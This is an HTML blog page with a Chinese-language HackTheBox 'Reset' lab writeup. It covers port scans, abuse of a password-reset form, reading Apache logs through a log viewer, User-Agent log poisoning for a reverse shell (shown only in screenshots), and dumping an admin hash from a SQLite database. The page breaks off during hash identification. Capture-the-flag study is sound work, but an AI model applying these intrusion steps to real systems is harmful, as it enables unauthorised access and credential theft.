@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- Google Fonts -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=LXGW+WenKai+Mono+TC:normal,bold,italic">
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox——HTB Reset Writeup">
+<meta property="og:url" content="https://n0nome.github.io/2025/07/22/Reset/Reset/index.html">
+<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
+<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0nome.github.io/images/reset.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-1.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-2.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-3.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-4.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-5.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-6.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-7.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-8.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-9.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-10.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-11.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-12.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-13.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-14.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-15.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-16.png">
+<meta property="og:image" content="https://n0nome.github.io/images/reset-17.png">
+<meta property="article:published_time" content="2025-07-22T00:08:27.867Z">
+<meta property="article:modified_time" content="2025-07-22T00:08:27.955Z">
+<meta property="article:author" content="n0nome">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0nome.github.io/images/reset.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/laojun.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox——HTB Reset Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-RXS95XH60B');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/07/18/Shibuya/Shibuya/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/07/22/Reset/Reset/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&text=HackTheBox——HTB Reset Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&is_video=false&description=HackTheBox——HTB Reset Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Reset Writeup&body=Check out this article: https://n0nome.github.io/2025/07/22/Reset/Reset/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&title=HackTheBox——HTB Reset Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/07/22/Reset/Reset/&name=HackTheBox——HTB Reset Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/07/22/Reset/Reset/&t=HackTheBox——HTB Reset Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    
+
+    
+      <!-- 如果文章被加密，初始隐藏目录 -->
+      <div id="toc" style="">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Next-Day"><span class="toc-number">1.1.</span> <span class="toc-text">Next Day</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Www-data"><span class="toc-number">2.</span> <span class="toc-text">Shell As Www-data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Sadm"><span class="toc-number">3.</span> <span class="toc-text">Shell As Sadm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root"><span class="toc-number">4.</span> <span class="toc-text">Shell As Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
+      </div>
+     
+ </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox——HTB Reset Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">n0nome</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-22T00:08:27.867Z" class="dt-published" itemprop="datePublished">2025-07-22</time>
+        
+        (Updated: <time datetime="2025-07-22T00:08:27.955Z" class="dt-updated" itemprop="dateModified">2025-07-22</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/reset.png" data-caption=""><img src="/images/reset.png"></a></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyAf6GPee+rQqSK2Xs/sDBPHvOh109nei1YDinqEqeQRyHAu7cYctKMIK5CFZojCtyJqLBB5Tmw7v6si1cjyBY=</span><br><span class="line">|   256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:<span class="built_in">df</span>:b8:86:0c:69 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILiu1L4RnPAcunzYAHckqjzFY2I4PHhzCheH+7SMZKnS</span><br><span class="line">80/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: Admin Login</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">514/tcp open  shell   syn-ack ttl 63 Netkit rshd</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>斯哈斯哈，先看一眼80，就一眼不多看<br><a data-fancybox="gallery" data-src="/images/reset-1.png" data-caption=""><img src="/images/reset-1.png"></a></p>
+<p>不对，这端口扫的有问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-19 21:17 +0800</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.234.130</span><br><span class="line">Host is up (7.9s latency).</span><br><span class="line">Not shown: 63671 filtered tcp ports (no-response), 1861 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">512/tcp open  <span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<p>这咋还有别的<br>一边扫着一边看80吧（谁让他稳定呢）</p>
+<p>在尝试弱口令之后看一下网页源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">&#x27;#resetPasswordForm&#x27;</span>).on(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(e) &#123;</span><br><span class="line">        e.preventDefault();</span><br><span class="line">        const username = $(<span class="string">&#x27;#resetUsername&#x27;</span>).val();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: <span class="string">&#x27;reset_password.php&#x27;</span>,</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            data: &#123; username: username &#125;,</span><br><span class="line">            success: <span class="keyword">function</span>(data) &#123;</span><br><span class="line">                $(<span class="string">&#x27;#resetMessage&#x27;</span>).removeClass(<span class="string">&#x27;alert-danger alert-success&#x27;</span>).show();</span><br><span class="line">                <span class="keyword">if</span> (data.error) &#123;</span><br><span class="line">                    $(<span class="string">&#x27;#resetMessage&#x27;</span>).addClass(<span class="string">&#x27;alert-danger&#x27;</span>).text(data.error);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $(<span class="string">&#x27;#resetMessage&#x27;</span>).addClass(<span class="string">&#x27;alert-success&#x27;</span>).html(`</span><br><span class="line">                        Password reset successful!&lt;br&gt;</span><br><span class="line">                        Timestamp: <span class="variable">$&#123;data.timestamp&#125;</span></span><br><span class="line">                    `);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">                $(<span class="string">&#x27;#resetMessage&#x27;</span>).removeClass(<span class="string">&#x27;alert-success&#x27;</span>).addClass(<span class="string">&#x27;alert-danger&#x27;</span>).text(<span class="string">&#x27;An error occurred while resetting the password.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用户填写用户名后，表单不执行传统提交，而是通过 AJAX 异步调用 reset_password.php。根据后端返回的数据动态在页面上显示“成功”或“失败”的提示，并在成功时附带一个时间戳。</p>
+</blockquote>
+<p>正好有一个忘记密码的选项<br><a data-fancybox="gallery" data-src="/images/reset-2.png" data-caption=""><img src="/images/reset-2.png"></a></p>
+<p>输了一个admin他就返回了一个新密码<br>试试能不能登录</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-3.png" data-caption=""><img src="/images/reset-3.png"></a></p>
+<p>哎牛逼哦<br>看着是一个可以看log文件的程序，但是他是一点都不给我返回</p>
+<p>扫一下目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└─$ dirsearch -u http://10.129.234.130/             </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/wansh/Reset/reports/http_10.129.234.130/__25-07-19_14-03-40.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.129.234.130/</span><br><span class="line"></span><br><span class="line">[14:03:40] Starting: </span><br><span class="line">[14:04:46] 403 -  279B  - /.ht_wsr.txt</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess.bak1</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess.orig</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess.sample</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess_extra</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess.save</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccessOLD</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccessBAK</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess_orig</span><br><span class="line">[14:04:46] 403 -  279B  - /.htaccess_sc</span><br><span class="line">[14:04:47] 403 -  279B  - /.htaccessOLD2</span><br><span class="line">[14:04:47] 403 -  279B  - /.html</span><br><span class="line">[14:04:47] 403 -  279B  - /.htm</span><br><span class="line">[14:04:47] 403 -  279B  - /.htpasswds</span><br><span class="line">[14:04:47] 403 -  279B  - /.htpasswd_test</span><br><span class="line">[14:04:47] 403 -  279B  - /.httr-oauth</span><br><span class="line">[14:05:05] 403 -  279B  - /.php</span><br><span class="line">[14:09:03] 302 -    0B  - /dashboard.php  -&gt;  index.php</span><br><span class="line">[14:11:42] 403 -  279B  - /server-status</span><br><span class="line">[14:11:42] 403 -  279B  - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p>nothing，那只能在请求上面动手了<br>嗷，再搂一眼nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">53/tcp  open  domain</span><br><span class="line">80/tcp  open  http</span><br><span class="line">512/tcp open  <span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<p>哎，我***<br>还是看我的req去吧<br>在<a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/">hacktricks</a>找到文章<a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html?highlight=request%20XSS#using-http-request-smuggling-to-exploit-reflected-xss">Using HTTP request smuggling to exploit reflected XSS</a></p>
+<p>模仿一下</p>
+<p>网不好了，明天打吧</p>
+<h3 id="Next-Day"><a href="#Next-Day" class="headerlink" title="Next Day"></a>Next Day</h3><p>这里接着模仿，用原来的payload没作用</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-4.png" data-caption=""><img src="/images/reset-4.png"></a></p>
+<p>换一个payload去</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-5.png" data-caption=""><img src="/images/reset-5.png"></a></p>
+<p>换一个也不得行<br>回想他两个log文件都不展示，是不是没有权限干这事，得找有权限的文件去</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-6.png" data-caption=""><img src="/images/reset-6.png"></a></p>
+<p>发现他有apache的服务器，那可以看一下在<code>/var/log/</code>目录下的子目录日志文件</p>
+<blockquote>
+<p>A typical location for all log files is &#x2F;var&#x2F;log and subdirectories. Try &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log or &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log or &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log. If the logs aren’t there, try running locate access.log access_log.</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/images/reset-7.png" data-caption=""><img src="/images/reset-7.png"></a></p>
+<p>看一眼</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-8.png" data-caption=""><img src="/images/reset-8.png"></a></p>
+<p>这个 <code>%2Fvar%2Flog%2Fapache2%2Faccess%2Elog</code>才可以诶（把机器重置了一下）<br>再利用一下</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-9.png" data-caption=""><img src="/images/reset-9.png"></a><br>先通过<code>User-Agent</code>代理投毒进去，然后</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-10.png" data-caption=""><img src="/images/reset-10.png"></a></p>
+<p>在运行可以加载我们的毒了，改一下payload拿reverse shell</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-11.png" data-caption=""><img src="/images/reset-11.png"></a></p>
+<p>然后就可以收到了</p>
+<p><a data-fancybox="gallery" data-src="/images/reset-12.png" data-caption=""><img src="/images/reset-12.png"></a></p>
+<h2 id="Shell-As-Www-data"><a href="#Shell-As-Www-data" class="headerlink" title="Shell As Www-data"></a>Shell As Www-data</h2><p>刚进去下面有个数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@reset:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">dashboard.php  index.php  private_34eee5d2  reset_password.php</span><br><span class="line">www-data@reset:/var/www/html$ file private_34eee5d2</span><br><span class="line">file private_34eee5d2</span><br><span class="line">private_34eee5d2: directory</span><br><span class="line">www-data@reset:/var/www/html$ <span class="built_in">cd</span> private/</span><br><span class="line"><span class="built_in">cd</span> private/</span><br><span class="line">bash: <span class="built_in">cd</span>: private/: No such file or directory</span><br><span class="line">www-data@reset:/var/www/html$ <span class="built_in">cd</span> private*</span><br><span class="line"><span class="built_in">cd</span> private*</span><br><span class="line">www-data@reset:/var/www/html/private_34eee5d2$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">db.sqlite</span><br><span class="line">www-data@reset:/var/www/html/private_34eee5d2$ file db*</span><br><span class="line">file db*</span><br><span class="line">db.sqlite: SQLite 3.x database, last written using SQLite version 3037002, file counter 12, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 12</span><br></pre></td></tr></table></figure>
+
+<p>拿出来为我所用</p>
+<blockquote>
+<p>用db broswer还打不开，会报<code>: database disk image is malformed</code></p>
+</blockquote>
+<p>笑死，本地也会报错，在人家的机器上试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@reset:/var/www/html/private_34eee5d2$ sqlite3 db.sqlite .dump</span><br><span class="line">sqlite3 db.sqlite .dump</span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE <span class="built_in">users</span> (</span><br><span class="line">    <span class="built_in">id</span> INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">    username TEXT NOT NULL UNIQUE,</span><br><span class="line">    password_hash TEXT NOT NULL,</span><br><span class="line">    is_admin INTEGER DEFAULT 0</span><br><span class="line">);</span><br><span class="line">INSERT INTO <span class="built_in">users</span> VALUES(1,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;b074782af9d530dd9316d26accfd8ff0e4cba29c&#x27;</span>,1);</span><br><span class="line">DELETE FROM sqlite_sequence;</span><br><span class="line">INSERT INTO sqlite_sequence VALUES(<span class="string">&#x27;users&#x27;</span>,1);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
+
+<p>除了一个hash，但是隐隐感觉不对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">└─$ nth -t <span class="string">&#x27;b074782af9d530dd9316d26accfd8ff0e4cba29c&#x27;</span>                                     </span><br><span class="line">                                                                                          </span><br><span class="line">  _   _                           _____ _           _          _   _           _          </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |    </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__       </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string">                                                                                          </span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash                                                </span></span><br><span class="line"><span class="string">                                                                                          </span></span><br><span class="line"><span class="string">                      </span></span><br><span class="line"><span class="string">b074782af9d530dd9316d26accfd8ff0e4cba29c</span></span><br><span class="line"><span class="string">                      </span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">SHA-1, HC: 100 JtR: raw-sha1 Summary: Used for checksums.See more</span></span><br><span class="line"><span class="string">HMAC-SHA1 